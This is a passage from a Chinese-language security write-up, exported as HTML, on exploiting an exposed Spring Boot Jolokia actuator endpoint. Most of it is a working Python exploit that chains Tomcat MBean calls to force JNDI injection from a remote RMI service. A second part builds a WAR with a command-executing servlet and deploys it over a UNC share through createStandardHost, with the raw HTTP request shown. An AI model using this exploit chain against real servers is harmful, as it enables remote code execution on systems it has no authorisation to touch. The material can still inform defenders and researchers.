		<p class="cs40DD2BC9"><span class="cs9C1B1871">由于</span><span class="cs8926E06"> Spring Boot </span><span class="cs9C1B1871">内嵌了</span><span class="cs8926E06"> Tomcat </span><span class="cs9C1B1871">和</span><span class="cs8926E06"> Tomcat EL</span><span class="cs9C1B1871">，可以直接使用文章中的</span><span class="cs8926E06"> Exploit</span><span class="cs9C1B1871">。最终</span><span class="cs8926E06"> Exploit </span><span class="cs9C1B1871">触发分为五个步骤。</span></p><ol style="margin-top:0;margin-bottom:0;">
			<ol style="margin-top:0;margin-bottom:0;">
				<li class="cs82E15C94"><span class="cs9C1B1871">创建</span><span class="cs8926E06"> JNDIRealm</span></li><li class="cs82E15C94"><span class="cs9C1B1871">写入</span><span class="cs8926E06"> connectionURL </span><span class="cs9C1B1871">为你的</span><span class="cs8926E06"> RMI Service URL</span></li><li class="cs82E15C94"><span class="cs9C1B1871">写入</span><span class="cs8926E06"> contextFactory </span><span class="cs9C1B1871">为</span><span class="cs8926E06"> RegistryContextFactory</span></li><li class="cs82E15C94"><span class="cs9C1B1871">停止</span><span class="cs8926E06"> Realm</span></li><li class="cs82E15C94"><span class="cs9C1B1871">启动</span><span class="cs8926E06"> Realm </span><span class="cs9C1B1871">以触发</span><span class="cs8926E06"> JNDI </span><span class="cs9C1B1871">注入</span></li></ol>
		</ol>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">最终</span><span class="cs8926E06"> Exploit </span><span class="cs9C1B1871">如下：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&nbsp;import requests, sys, time, pprint</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> url = sys.argv[1]</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> create_realm = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&quot;mbean&quot;: &quot;Tomcat:type=MBeanFactory&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&quot;type&quot;: &quot;EXEC&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&quot;operation&quot;: &quot;createJNDIRealm&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&quot;arguments&quot;: [&quot;Tomcat:type=Engine&quot;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> }</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> wirte_factory = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&quot;mbean&quot;: &quot;Tomcat:realmPath=/realm0,type=Realm&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&quot;type&quot;: &quot;WRITE&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&quot;attribute&quot;: &quot;contextFactory&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&quot;value&quot;: &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> }</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> write_url = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&quot;mbean&quot;: &quot;Tomcat:realmPath=/realm0,type=Realm&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&quot;type&quot;: &quot;WRITE&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&quot;attribute&quot;: &quot;connectionURL&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&quot;value&quot;: &quot;rmi://localhost:1097/Object&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> }</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> stop = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&quot;mbean&quot;: &quot;Tomcat:realmPath=/realm0,type=Realm&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&quot;type&quot;: &quot;EXEC&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&quot;operation&quot;: &quot;stop&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&quot;arguments&quot;: []</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> }</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> start = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&quot;mbean&quot;: &quot;Tomcat:realmPath=/realm0,type=Realm&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&quot;type&quot;: &quot;EXEC&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&quot;operation&quot;: &quot;start&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&quot;arguments&quot;: []</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> }</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> flow = [create_realm, wirte_factory, write_url, stop, start]</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> for i in flow:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;print(&#39;%s MBean %s: %s ...&#39; % (i[&#39;type&#39;].title(), i[&#39;mbean&#39;], i.get(&#39;operation&#39;, i.get(&#39;attribute&#39;))))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;requests.post(url, json=i).json()</span></p><h3 class="cs868C439D">
			<a name="补充"><span class="csD6CA00D2">补充</span></a></h3>
		<p class="cs40DD2BC9"><span class="csE3F655E4">利用</span><span class="cs5BEC2C28">UNC</span><span class="csE3F655E4">部署</span><span class="cs5BEC2C28">war</span><span class="csE3F655E4">文件（只能用于</span><span class="cs5BEC2C28">windows</span><span class="csE3F655E4">）</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06"> Tomcat Host Manager </span><span class="cs9C1B1871">这里可以利用</span><span class="cs8926E06"> UNC </span><span class="cs9C1B1871">来部署</span><span class="cs8926E06"> war </span><span class="cs9C1B1871">文件。实际上对于</span><span class="cs8926E06">Tomcat:type=MBeanFactory </span><span class="cs9C1B1871">的</span><span class="cs8926E06">createStandardHost</span><span class="cs9C1B1871">，和</span><span class="cs8926E06"> Host Manager </span><span class="cs9C1B1871">这里调用的是相同的方法。所以根据文章所述的方法，我们同样可以在</span><span class="cs8926E06">Jolokia </span><span class="cs9C1B1871">里重现。不过可惜的是这里只对</span><span class="cs8926E06"> Windows </span><span class="cs9C1B1871">有效。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">首先去</span><span class="cs8926E06"> spring-boot </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> Github </span><span class="cs9C1B1871">下载</span><span class="cs8926E06"> spring-boot-samples-traditional</span><span class="cs9C1B1871">，在</span><span class="cs8926E06"> web.xml </span><span class="cs9C1B1871">里添加如下内容：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;servlet&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;servlet-name&gt;default&lt;/servlet-name&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;servlet-class&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;org.apache.catalina.servlets.DefaultServlet</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;/servlet-class&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;init-param&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;param-name&gt;debug&lt;/param-name&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;param-value&gt;0&lt;/param-value&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;/init-param&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;init-param&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;param-name&gt;listings&lt;/param-name&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;param-value&gt;false&lt;/param-value&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;/init-param&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/servlet&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">&lt;servlet-mapping&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;servlet-name&gt;default&lt;/servlet-name&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;url-pattern&gt;/default&lt;/url-pattern&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/servlet-mapping&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后修改</span><span class="cs8926E06"> WebConfig.java</span><span class="cs9C1B1871">，在</span><span class="cs8926E06"> dispatcherServlet </span><span class="cs9C1B1871">添加执行命令的代码：</span></p><p class="cs3A447A38"><span class="cs9FB05234">@Bean</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// Only used when running in embedded servlet</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">public DispatcherServlet dispatcherServlet() throws Exception {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Runtime.getRuntime().exec(&quot;calc&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return new DispatcherServlet();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">接着打包成</span><span class="cs8926E06"> war </span><span class="cs9C1B1871">文件放在远程的共享服务器上面，发送如下请求即可：</span></p><p class="cs3A447A38"><span class="cs9FB05234">POST /jolokia HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: localhost</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/json</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 192</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;mbean&quot;: &quot;Tomcat:type=MBeanFactory&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;type&quot;: &quot;EXEC&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;operation&quot;: &quot;createStandardHost&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;arguments&quot;: [&quot;Tomcat:type=Engine&quot;, &quot;test2&quot;, &quot;\\127.0.0.1\test&quot;, true, true, true, true]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p></body>
</html>
